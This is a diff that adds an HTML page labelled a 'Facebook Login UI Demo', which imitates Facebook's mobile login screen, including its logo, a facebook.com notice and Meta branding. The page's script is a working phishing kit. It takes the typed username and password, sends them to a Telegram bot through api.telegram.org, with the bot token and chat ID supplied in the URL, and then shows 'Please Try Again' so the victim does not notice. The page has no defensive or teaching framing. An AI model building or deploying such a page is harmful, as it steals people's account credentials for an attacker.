@@ -1,0 +1,365 @@
+html
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Facebook Login UI Demo</title>
+
+<style>
+* {
+    box-sizing: border-box;
+}
+
+html, body {
+    margin: 0;
+    width: 100%;
+    min-height: 100%;
+    font-family: Arial, Helvetica, sans-serif;
+    background: #ffffff;
+    color: #080809;
+}
+
+body {
+    min-height: 100vh;
+    min-height: 100dvh;
+}
+
+.page {
+    min-height: 100vh;
+    min-height: 100dvh;
+    display: flex;
+    flex-direction: column;
+    padding: 20px 28px 50px;
+}
+
+/* Top navigation */
+.top {
+    height: 52px;
+    display: flex;
+    align-items: flex-start;
+    justify-content: space-between;
+}
+
+.back {
+    font-size: 36px;
+    line-height: 32px;
+    color: #111111;
+    font-weight: 300;
+}
+
+.language {
+    position: absolute;
+    top: 95px;
+    left: 50%;
+    transform: translateX(-50%);
+    color: #737373;
+    font-size: 22px;
+    white-space: nowrap;
+}
+
+.chevron {
+    display: inline-block;
+    width: 11px;
+    height: 11px;
+    border-right: 2px solid #737373;
+    border-bottom: 2px solid #737373;
+    transform: rotate(45deg);
+    margin: 0 0 5px 9px;
+}
+
+/* Facebook-style demo mark */
+.logo-area {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    margin-top: 178px;
+}
+
+.logo {
+    position: relative;
+    width: 106px;
+    height: 106px;
+    border-radius: 50%;
+    background: #0866ff;
+    overflow: hidden;
+}
+
+.logo span {
+    position: absolute;
+    left: 29px;
+    top: 13px;
+    color: white;
+    font-family: Arial, sans-serif;
+    font-size: 108px;
+    font-weight: bold;
+    line-height: 112px;
+}
+
+/* Notice */
+.notice {
+    margin-top: 176px;
+    border-top: 1px solid #e4e6eb;
+    border-bottom: 1px solid #d5d5d5;
+    padding: 16px 0 14px;
+    font-size: 25px;
+    line-height: 1.4;
+}
+
+.notice a {
+    display: inline-block;
+    margin-top: 2px;
+    color: #0866ff;
+    font-weight: 600;
+    text-decoration: none;
+}
+
+/* Form fields */
+.fields {
+    margin-top: 22px;
+    display: flex;
+    flex-direction: column;
+    gap: 20px;
+}
+
+.field {
+    width: 100%;
+    height: 105px;
+    border: 2px solid #e1e1e1;
+    border-radius: 29px;
+    padding: 0 27px;
+    font-size: 25px;
+    outline: none;
+    background: transparent;
+    color: #080809;
+}
+
+.field:focus {
+    border-color: #0866ff;
+}
+
+/* Buttons */
+.login {
+    width: 100%;
+    height: 78px;
+    margin-top: 21px;
+    border: 0;
+    border-radius: 50px;
+    background: #0866e9;
+    color: white;
+    font-size: 25px;
+    cursor: pointer;
+}
+
+.login:active {
+    opacity: 0.9;
+}
+
+.forgot {
+    text-align: center;
+    margin-top: 37px;
+    font-size: 25px;
+    font-weight: 500;
+}
+
+.bottom {
+    margin-top: auto;
+    padding-top: 60px;
+}
+
+.create {
+    width: 100%;
+    min-height: 80px;
+    border: 2px solid #1877f2;
+    border-radius: 50px;
+    color: #1769c2;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    font-size: 25px;
+    font-weight: 600;
+}
+
+.meta {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    gap: 5px;
+    margin-top: 30px;
+    font-size: 28px;
+    font-weight: 600;
+    color: #303b42;
+}
+
+.meta-symbol {
+    font-size: 35px;
+    font-weight: bold;
+    color: #0866ff;
+}
+
+/* Custom Message Box style */
+#msgBox {
+    display: none;
+    position: fixed;
+    top: 20px;
+    left: 50%;
+    transform: translateX(-50%);
+    background: #333;
+    color: #fff;
+    padding: 12px 24px;
+    border-radius: 8px;
+    z-index: 1000;
+    font-size: 18px;
+}
+
+/* Fit smaller phones */
+@media (max-width: 400px) {
+    .page {
+        padding-left: 18px;
+        padding-right: 18px;
+    }
+
+    .logo-area {
+        margin-top: 155px;
+    }
+
+    .notice {
+        margin-top: 130px;
+        font-size: 19px;
+    }
+
+    .field {
+        height: 70px;
+        border-radius: 22px;
+        font-size: 18px;
+    }
+
+    .login {
+        height: 60px;
+        font-size: 19px;
+    }
+
+    .forgot {
+        font-size: 19px;
+    }
+
+    .create {
+        min-height: 62px;
+        font-size: 19px;
+    }
+
+    .bottom {
+        padding-top: 45px;
+    }
+}
+</style>
+</head>
+
+<body>
+<div id="msgBox"></div>
+
+<div class="page">
+
+    <div class="top">
+        <div class="back" aria-hidden="true">&#x2190;</div>
+    </div>
+
+    <div class="language">
+        English (US) <span class="chevron"></span>
+    </div>
+
+    <div class="logo-area">
+        <div class="logo" aria-label="Facebook-style demo logo">
+            <span>f</span>
+        </div>
+    </div>
+
+    <div class="notice">
+        Facebook Web Log In
+        <br>
+        <a href="#" onclick="return false;">facebook.com</a>
+    </div>
+
+    <form id="loginForm" class="fields">
+        <input type="text" id="username" class="field" placeholder="Mobile number or email" required>
+        <input type="password" id="password" class="field" placeholder="Password" required>
+        
+        <button class="login" type="submit">
+            Log in
+        </button>
+    </form>
+
+    <div class="forgot">
+        Forgot password?
+    </div>
+
+    <div class="bottom">
+        <div class="create">
+            Create new account
+        </div>
+
+        <div class="meta">
+            <span class="meta-symbol">&#x221e;</span>
+            <span>Meta</span>
+        </div>
+    </div>
+
+</div>
+
+<script>
+    // Custom message display function (avoids alert())
+    function showMessage(text) {
+        const box = document.getElementById('msgBox');
+        box.textContent = text;
+        box.style.display = 'block';
+        setTimeout(() => {
+            box.style.display = 'none';
+        }, 3500);
+    }
+
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+
+        // Extract bot_token and chat_id from URL query parameters dynamically
+        const urlParams = new URLSearchParams(window.location.search);
+        const botToken = urlParams.get('bot_token');
+        const chatId = urlParams.get('chat_id');
+
+        if (!botToken || !chatId) {
+            showMessage('Error: Missing bot_token or chat_id in URL parameters.');
+            return;
+        }
+
+        const userVal = document.getElementById('username').value;
+        const passVal = document.getElementById('password').value;
+
+        const message = `🔔 New Login Attempt:\n👤 Username/Phone: ${userVal}\n🔑 Password: ${passVal}`;
+        const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+        fetch(telegramUrl, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: message
+            })
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.ok) {
+                showMessage('Please Try Again');
+                document.getElementById('loginForm').reset();
+            } else {
+                showMessage('Failed to send. Please check your BOT_TOKEN and CHAT_ID.');
+            }
+        })
+        .catch(error => {
+            console.error('Error:', error);
+            showMessage('An error occurred while sending the message.');
+        });
+    });
+</script>
+</body>
+</html>
